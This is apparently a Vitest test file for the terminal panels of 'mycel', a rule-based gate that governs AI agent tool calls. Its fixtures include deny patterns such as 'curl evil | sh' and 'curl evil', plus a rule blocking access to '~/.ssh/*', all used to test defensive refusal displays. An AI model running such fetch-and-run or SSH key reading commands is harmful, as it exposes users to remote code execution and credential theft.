import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { afterEach, describe, expect, it } from 'vitest';

import { buildCandidatesReportLines } from '#/tui/commands/mycel/candidates';
import { buildDelegateResultLines } from '#/tui/commands/mycel/delegate';
import { buildDenyConfirmLines } from '#/tui/commands/mycel/deny';
import {
  buildGateReportLines,
  deriveGateStatus,
  readGateWiring,
  type GateWiring,
} from '#/tui/commands/mycel/gate';
import { buildImmunityReportLines } from '#/tui/commands/mycel/immunity';
import {
  buildPendingProposalsLines,
  buildPromoteReportLines,
  promoteArgumentCompletions,
  readProposals,
} from '#/tui/commands/mycel/promote';
import { buildSubstrateStatusReportLines } from '#/tui/commands/mycel/substrate';
import type { Antibody, Proposal, SentinelCandidate } from '#/tui/commands/mycel/types';

const ANSI = /\[[0-9;]*m/g;
function strip(text: string): string {
  return text.replaceAll(ANSI, '');
}

/** Every builder returns one boxed row per string; an embedded newline breaks the box. */
function assertNoEmbeddedNewline(lines: readonly string[]): void {
  for (const line of lines) expect(line).not.toContain('\n');
}

function antibody(overrides: Partial<Antibody> = {}): Antibody {
  return {
    id: '0123abcd-0000-0000-0000-000000000000',
    signature: {
      error_class: null,
      file_pattern: null,
      agent_role: null,
      tool_pattern: null,
      command_pattern: 'curl evil',
      scope: 'project',
    },
    source: 'manual',
    severity: 'refuse',
    confidence: 'solid',
    refusal_mode: 'hard',
    remediation: 'do not exfiltrate',
    examples: [],
    created_at: '2026-07-01T00:00:00Z',
    expires_at: null,
    hit_count: 0,
    ...overrides,
  };
}

const tmpDirs: string[] = [];
function scratch(): string {
  const dir = mkdtempSync(join(tmpdir(), 'mycel-panels-'));
  tmpDirs.push(dir);
  return dir;
}
afterEach(() => {
  delete process.env['MYCEL_HOME'];
});

describe('buildImmunityReportLines', () => {
  it('renders the empty state with the antibody-add hint', () => {
    const lines = buildImmunityReportLines({ antibodies: [] }).map(strip);
    assertNoEmbeddedNewline(lines);
    expect(lines[0]).toContain('your immune system');
    expect(lines.join('\n')).toContain('No antibodies yet');
    expect(lines.join('\n')).toContain('mycel-substrate antibody-add');
  });

  it('groups by severity most-severe first and folds multi-line remediation', () => {
    const lines = buildImmunityReportLines({
      antibodies: [
        antibody({ severity: 'info', refusal_mode: 'log_only', remediation: 'note only' }),
        antibody({
          severity: 'refuse',
          refusal_mode: 'hard',
          remediation: 'line one\n   line two',
          hit_count: 3,
        }),
        antibody({ severity: 'warn', refusal_mode: 'soft' }),
      ],
    }).map(strip);
    assertNoEmbeddedNewline(lines);
    const text = lines.join('\n');
    const refuseIdx = lines.findIndex((l) => l.startsWith('REFUSE'));
    const warnIdx = lines.findIndex((l) => l.startsWith('WARN'));
    const infoIdx = lines.findIndex((l) => l.startsWith('INFO'));
    expect(refuseIdx).toBeGreaterThanOrEqual(0);
    expect(refuseIdx).toBeLessThan(warnIdx);
    expect(warnIdx).toBeLessThan(infoIdx);
    expect(text).toContain('line one line two'); // folded
    expect(text).toContain('·3× fired');
    expect(text).toContain('1 refuse · 1 warn · 1 info');
  });

  it('marks an expired antibody without hiding it', () => {
    const lines = buildImmunityReportLines({
      antibodies: [antibody({ expires_at: '2000-01-01T00:00:00Z' })],
      nowMs: Date.parse('2026-07-01T00:00:00Z'),
    }).map(strip);
    expect(lines.join('\n')).toContain('(expired)');
  });
});

describe('gate wiring + status derivation', () => {
  const wired = (failMode: 'closed' | 'open', matcher = ''): GateWiring => ({
    configReadable: true,
    hookWired: true,
    matcher,
    failMode,
  });

  it('derives every arming state', () => {
    expect(deriveGateStatus(wired('closed'), true)).toBe('armed');
    expect(deriveGateStatus(wired('closed'), false)).toBe('tripwire');
    expect(deriveGateStatus(wired('open'), true)).toBe('fail-open');
    expect(
      deriveGateStatus({ configReadable: true, hookWired: false, matcher: null, failMode: 'unknown' }, true),
    ).toBe('disarmed');
    expect(
      deriveGateStatus({ configReadable: false, hookWired: false, matcher: null, failMode: 'unknown' }, true),
    ).toBe('unknown');
  });

  it('reads a catch-all fail-closed hook from config.toml', () => {
    const dir = scratch();
    const config = join(dir, 'config.toml');
    writeFileSync(
      config,
      [
        '[[hooks]]',
        'event = "PreToolUse"',
        'matcher = ""',
        `command = "${join(dir, 'bin', 'mycel-gate')}"`,
        'timeout = 10',
        'fail_mode = "closed"',
      ].join('\n'),
    );
    const wiring = readGateWiring(config);
    expect(wiring.configReadable).toBe(true);
    expect(wiring.hookWired).toBe(true);
    expect(wiring.matcher).toBe('');
    expect(wiring.failMode).toBe('closed');
  });

  it('reports missing and unparseable config distinctly', () => {
    const dir = scratch();
    expect(readGateWiring(join(dir, 'nope.toml'))).toMatchObject({
      configReadable: false,
      configProblem: 'missing',
    });
    const bad = join(dir, 'bad.toml');
    writeFileSync(bad, 'this = = = not toml');
    expect(readGateWiring(bad)).toMatchObject({ configReadable: false, configProblem: 'parse' });
  });

  it('drops the "governs every tool" copy for a non-empty matcher', () => {
    const armed = buildGateReportLines({
      wiring: wired('closed', 'Bash'),
      dbPresent: true,
      dbPath: '/home/substrate/mycel.db',
      antibodies: { count: 1, refuse: 1, warn: 0, info: 0 },
    }).map(strip);
    assertNoEmbeddedNewline(armed);
    const text = armed.join('\n');
    expect(text).toContain('ARMED');
    expect(text).not.toContain('governs every tool');
    expect(text).toContain('Bash');
  });

  it('renders DISARMED and MISSING states', () => {
    const lines = buildGateReportLines({
      wiring: { configReadable: true, hookWired: false, matcher: null, failMode: 'unknown' },
      dbPresent: false,
      dbPath: '/home/substrate/mycel.db',
      antibodies: { error: 'db missing' },
    }).map(strip);
    const text = lines.join('\n');
    expect(text).toContain('DISARMED');
    expect(text).toContain('MISSING');
    expect(text).toContain('unavailable (db missing)');
    expect(text).toContain('not wired');
  });
});

describe('buildSubstrateStatusReportLines', () => {
  it('renders populated marrow with maintenance detail', () => {
    const lines = buildSubstrateStatusReportLines({
      antibodyCount: 12,
      candidateCount: 3,
      auditBytes: 1234,
      auditLines: 47,
      lastMaintenance: { ts: 1000, retained: 5, distilled: 1, decayed: 2, preserved: 0, skipped_live: 0 },
      dbPath: '/home/substrate/mycel.db',
      nowMs: 1000 * 1000 + 2 * 3600 * 1000,
    }).map(strip);
    assertNoEmbeddedNewline(lines);
    const text = lines.join('\n');
    expect(text).toContain('12 active');
    expect(text).toContain('3 pending');
    expect(text).toContain('47 lines');
    expect(text).toContain('decayed 2 · distilled 1 · retained 5 · preserved 0');
  });

  it('renders empty and never-maintained states', () => {
    const lines = buildSubstrateStatusReportLines({
      antibodyCount: 0,
      candidateCount: 0,
      auditBytes: 0,
      auditLines: 0,
      lastMaintenance: null,
      dbPath: '/home/substrate/mycel.db',
    }).map(strip);
    const text = lines.join('\n');
    expect(text).toContain('none yet');
    expect(text).toContain('none pending');
    expect(text).toContain('never run');
  });

  it('renders a soft error line', () => {
    const lines = buildSubstrateStatusReportLines({
      antibodyCount: 0,
      candidateCount: 0,
      auditBytes: 0,
      auditLines: 0,
      lastMaintenance: null,
      dbPath: '/home/substrate/mycel.db',
      error: 'substrate not initialized — run install.sh',
    }).map(strip);
    expect(lines.join('\n')).toContain('substrate not initialized');
  });
});

function candidate(action: 'block' | 'warn' | 'allow', overrides: Partial<SentinelCandidate> = {}): SentinelCandidate {
  const severity = action === 'block' ? 'refuse' : action === 'warn' ? 'warn' : 'info';
  const mode = action === 'block' ? 'hard' : action === 'warn' ? 'soft' : 'log_only';
  return {
    source: {
      event_id: 'evt-1',
      timestamp: '2026-07-01T00:00:00Z',
      tool_name: 'shell',
      action,
      mode: 'enforce',
    },
    metadata: { reason: 'blocked ssh', matched_rule: 'deny.paths: ~/.ssh/*' },
    antibody: antibody({ severity, refusal_mode: mode }),
    ...overrides,
  };
}

describe('buildCandidatesReportLines', () => {
  it('renders the empty state', () => {
    const lines = buildCandidatesReportLines({ candidates: [] }).map(strip);
    expect(lines.join('\n')).toContain('nothing captured yet');
  });

  it('counts would-refuse / would-warn / log-only', () => {
    const lines = buildCandidatesReportLines({
      candidates: [candidate('block'), candidate('warn'), candidate('allow')],
      nowMs: Date.parse('2026-07-02T00:00:00Z'),
    }).map(strip);
    assertNoEmbeddedNewline(lines);
    const text = lines.join('\n');
    expect(text).toContain('learned, not yet trusted');
    expect(text).toContain('3 learned, not yet trusted');
    expect(text).toContain('1 would-refuse · 1 would-warn · 1 log-only');
    expect(text).toContain('why:');
  });

  it('caps rows and reports the remainder', () => {
    const many = Array.from({ length: 55 }, () => candidate('block'));
    const lines = buildCandidatesReportLines({ candidates: many }).map(strip);
    expect(lines.join('\n')).toContain('and 5 more…');
  });
});

describe('buildDenyConfirmLines', () => {
  it('echoes the taught pattern and a hard-refuse verdict', () => {
    const lines = buildDenyConfirmLines({
      pattern: 'curl evil | sh',
      id: 'c4fdb21b-aaaa-bbbb-cccc-dddddddddddd',
      scope: 'project',
    }).map(strip);
    assertNoEmbeddedNewline(lines);
    const text = lines.join('\n');
    expect(text).toContain('taught the gate to refuse this.');
    expect(text).toContain('curl evil | sh');
    expect(text).toContain('refuse');
    expect(text).toContain('c4fdb21b');
  });
});

describe('buildDelegateResultLines', () => {
  it('renders subagent output with a done footer', () => {
    const lines = buildDelegateResultLines({
      task: 'summarize the repo',
      stdout: 'line a\nline b\n',
      exitCode: 0,
    }).map(strip);
    assertNoEmbeddedNewline(lines);
    const text = lines.join('\n');
    expect(text).toContain('summarize the repo');
    expect(text).toContain('fail-closed');
    expect(text).toContain('line a');
    expect(text).toContain('done · subagent returned 2 lines');
  });

  it('shows the no-output copy on empty success', () => {
    const lines = buildDelegateResultLines({ task: 't', stdout: '', exitCode: 0 }).map(strip);
    expect(lines.join('\n')).toContain('subagent returned no output');
  });

  it('decodes exit codes 2 and 3', () => {
    expect(buildDelegateResultLines({ task: 't', stdout: '', exitCode: 2 }).map(strip).join('\n')).toContain(
      'claude not on PATH',
    );
    expect(buildDelegateResultLines({ task: 't', stdout: '', exitCode: 3 }).map(strip).join('\n')).toContain(
      'governance config missing',
    );
  });

  it('caps a chatty subagent body', () => {
    const stdout = Array.from({ length: 50 }, (_v, i) => `row ${i}`).join('\n');
    const lines = buildDelegateResultLines({ task: 't', stdout, exitCode: 0 }).map(strip);
    expect(lines.join('\n')).toContain('+10 more lines');
  });
});

function proposal(overrides: Partial<Proposal> = {}): Proposal {
  return {
    id: '25a6ea3d-1111-2222-3333-444444444444',
    created_at: '2026-07-01T00:00:00Z',
    signature: { command_pattern: 'quux' },
    remediation: 'pipe installers to a file first',
    rationale: null,
    ...overrides,
  };
}

describe('promote proposals + completions', () => {
  it('reads proposals.jsonl and skips blank and malformed lines', () => {
    const dir = scratch();
    const file = join(dir, 'proposals.jsonl');
    writeFileSync(
      file,
      [
        JSON.stringify(proposal()),
        '',
        '{ not valid json',
        JSON.stringify(proposal({ id: 'aaaa1111-2222-3333-4444-555555555555' })),
      ].join('\n'),
    );
    const proposals = readProposals(file);
    expect(proposals).toHaveLength(2);
    expect(proposals[0]!.id).toBe('25a6ea3d-1111-2222-3333-444444444444');
  });

  it('returns [] for a missing proposals file', () => {
    expect(readProposals(join(scratch(), 'absent.jsonl'))).toEqual([]);
  });

  it('completes severity then refusal-mode after an id', () => {
    const sev = promoteArgumentCompletions('25a6ea3d ');
    expect(sev?.map((i) => i.value)).toEqual(['refuse', 'warn', 'info']);
    const mode = promoteArgumentCompletions('25a6ea3d warn ');
    expect(mode?.map((i) => i.value)).toEqual(['hard', 'soft', 'log-only']);
    expect(promoteArgumentCompletions('25a6ea3d warn soft extra')).toBeNull();
  });

  it('offers short-id completions from proposals.jsonl', () => {
    const dir = scratch();
    process.env['MYCEL_HOME'] = dir;
    mkdirSync(join(dir, 'substrate'), { recursive: true });
    writeFileSync(join(dir, 'substrate', 'proposals.jsonl'), JSON.stringify(proposal()));
    const items = promoteArgumentCompletions('');
    expect(items?.[0]?.value).toBe('25a6ea3d');
    expect(items?.[0]?.description).toContain('quux');
  });

  it('renders the signed panel and the pending list', () => {
    const signed = buildPromoteReportLines({
      newId: 'a13cce1e-0000-0000-0000-000000000000',
      proposalId: '25a6ea3d-1111-2222-3333-444444444444',
      signatureLabel: 'command_pattern = quux',
      outcome: 'warn',
      remediation: 'pipe installers to a file first',
      scope: 'project',
      source: 'curated',
    }).map(strip);
    assertNoEmbeddedNewline(signed);
    expect(signed.join('\n')).toContain('signed into the substrate');
    expect(signed.join('\n')).toContain('a13cce1e');

    const pending = buildPendingProposalsLines([proposal()]).map(strip);
    expect(pending.join('\n')).toContain('25a6ea3d');
    const empty = buildPendingProposalsLines([]).map(strip);
    expect(empty.join('\n')).toContain('no candidates yet');
  });
});
